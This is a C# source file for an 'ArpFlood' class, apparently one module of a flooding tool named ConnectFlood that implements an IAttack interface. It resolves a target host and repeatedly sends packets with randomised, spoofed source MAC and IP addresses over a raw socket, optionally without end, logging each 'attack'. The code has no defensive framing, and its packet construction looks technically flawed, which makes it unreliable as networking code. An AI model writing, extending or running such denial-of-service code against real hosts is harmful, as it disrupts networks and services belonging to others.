using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

namespace ConnectFlood
{
    public class ArpFlood : IAttack
    {
        [DllImport("ws2_32.dll", SetLastError = true)]
        private static extern int sendto(IntPtr s, byte[] buf, int len, int flags, IntPtr to, int tolen);

        public void StartFlood(string target, int packetCount, int speed ,string none)
        {
            try
            {
                string ipAddress = ResolveTarget(target);

                Console.WriteLine($"[ARP] Attacking {target} ({ipAddress}) | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms");

                int sentPackets = 0;
                Random random = new Random();

                while (packetCount == -1 || sentPackets < packetCount)
                {
                    try
                    {
                        byte[] arpPacket = GenerateArpPacket(ipAddress, random);

                        using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Raw))
                        {
                            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ipAddress), 0);
                            socket.SendTo(arpPacket, endPoint);
                        }

                        Console.WriteLine($"[ARP] Packet {sentPackets + 1} sent to {ipAddress}");

                        sentPackets++;
                        Thread.Sleep(speed);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[ARP] Error: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ARP] Failed to resolve target: {ex.Message}");
            }

            Console.WriteLine("[ARP] Attack finished.");
        }

        private string ResolveTarget(string target)
        {
            target = target.Replace("http://", "").Replace("https://", "");
            int portIndex = target.IndexOf(":");
            if (portIndex != -1)
            {
                target = target.Substring(0, portIndex);
            }
            if (IPAddress.TryParse(target, out _))
                return target;
            IPAddress[] addresses = Dns.GetHostAddresses(target);
            if (addresses.Length > 0)
                return addresses[0].ToString();

            throw new Exception("Could not resolve target.");
        }

        private byte[] GenerateArpPacket(string target, Random random)
        {
            byte[] packet = new byte[42];

            byte[] srcMac = new byte[6];
            byte[] targetMac = new byte[6]; // 00:00:00:00:00:00
            byte[] srcIp = new byte[4];
            byte[] targetIp = IPAddress.Parse(target).GetAddressBytes();

            random.NextBytes(srcMac);
            random.NextBytes(srcIp);

            Array.Copy(new byte[] { 0x00, 0x01 }, 0, packet, 0, 2);
            Array.Copy(new byte[] { 0x08, 0x00 }, 0, packet, 2, 2);
            packet[4] = 6;
            packet[5] = 4;
            Array.Copy(new byte[] { 0x00, 0x01 }, 0, packet, 6, 2);

            Array.Copy(srcMac, 0, packet, 8, 6);
            Array.Copy(srcIp, 0, packet, 14, 4);
            Array.Copy(targetMac, 0, packet, 18, 6);
            Array.Copy(targetIp, 0, packet, 24, 4);

            return packet;
        }
    }
}
